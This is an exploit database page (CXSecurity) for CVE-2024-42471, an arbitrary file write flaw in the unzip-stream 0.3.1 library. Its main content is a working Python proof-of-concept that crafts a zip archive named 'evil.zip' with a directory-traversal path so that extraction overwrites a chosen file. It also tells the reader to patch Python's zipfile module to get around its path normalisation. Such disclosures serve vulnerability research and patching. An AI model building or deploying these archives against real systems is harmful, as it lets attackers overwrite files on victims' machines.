---
title: unzip-stream 0.3.1 Arbitrary File Write
url: https://cxsecurity.com/issue/WLB-2025050007
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-02
fetch_date: 2025-10-06T22:27:13.154451
---

# unzip-stream 0.3.1 Arbitrary File Write

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **unzip-stream 0.3.1 Arbitrary File Write** **2025.05.01**  Credit:  **[Ardayfio Samuel Nii Aryee](https://cxsecurity.com/author/Ardayfio%2BSamuel%2BNii%2BAryee/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2024-42471](https://cxsecurity.com/cveshow/CVE-2024-42471/ "Click to see CVE-2024-42471")**  CWE: **N/A** | |

# Exploit Title: unzip-stream 0.3.1 - Arbitrary File Write
# Date: 18th April, 2024
# Exploit Author: Ardayfio Samuel Nii Aryee
# Software link: https://github.com/mhr3/unzip-stream
# Version: unzip-stream 0.3.1
# Tested on: Ubuntu
# CVE: CVE-2024-42471
# NB: Python's built-in `zipfile` module has limitations on the `arcname` parameter.
# To bypass this restriction, edit the module's source code (`zipfile.py`) and comment out the following line:
# arcname = os.path.normpath(os.path.splitdrive(arcname)[1])
# For a more detailed explanation, feel free to check out my blog post here: https://themcsam.github.io/posts/unzip-stream-PoC/
import zipfile
import os
import sys
file\_path = './poc' # Change to the file which contains the data to write
zip\_name = 'evil.zip'
path\_to\_overwrite\_file = 'home/mcsam/pocc' # Change to target file to write/overwrite
if not os.path.isfile(file\_path):
print(f"Error: File '{file\_path}' does not exist.")
sys.exit()
with zipfile.ZipFile(zip\_name, 'w', zipfile.ZIP\_DEFLATED) as zipf:
zipf.write(file\_path, \
arcname=f'hack/../../../../../../../../../../../../../../{path\_to\_overwrite\_file}')
print(f"File '{file\_path}' has been zipped as '{zip\_name}'.")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050007)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top